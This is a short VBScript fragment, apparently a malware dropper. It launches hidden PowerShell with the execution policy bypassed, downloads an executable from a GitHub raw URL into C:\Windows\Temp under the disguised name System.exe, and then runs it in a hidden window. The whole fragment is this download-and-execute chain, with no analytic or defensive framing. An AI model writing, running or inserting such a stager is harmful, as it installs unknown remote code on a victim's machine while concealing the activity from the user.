...
objShell.Run "powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/newuser034/powershell1/raw/main/System%20file.exe -o C:\Windows\Temp\System.exe", 0, True
objShell.Run "powershell.exe -w Hidden C:\Windows\Temp\System.exe", 0, True
